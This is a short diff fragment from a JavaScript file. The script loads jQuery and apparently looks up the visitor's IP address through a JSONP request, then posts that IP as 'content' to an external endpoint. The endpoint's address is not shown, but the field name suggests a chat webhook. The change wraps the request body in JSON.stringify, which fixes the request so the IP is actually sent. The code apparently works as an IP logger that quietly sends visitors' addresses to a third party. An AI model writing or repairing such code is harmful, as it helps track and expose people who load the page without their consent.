@@ -8,9 +8,9 @@ import("https://code.jquery.com/jquery-3.6.1.js").then(function() {
 			headers: {
 				"Content-Type": "application/json"
 			},
-			body: {
+			body: JSON.stringify({
 				content: a.ip
-			}
+			})
 		});
 	}, "JSONP");
 });
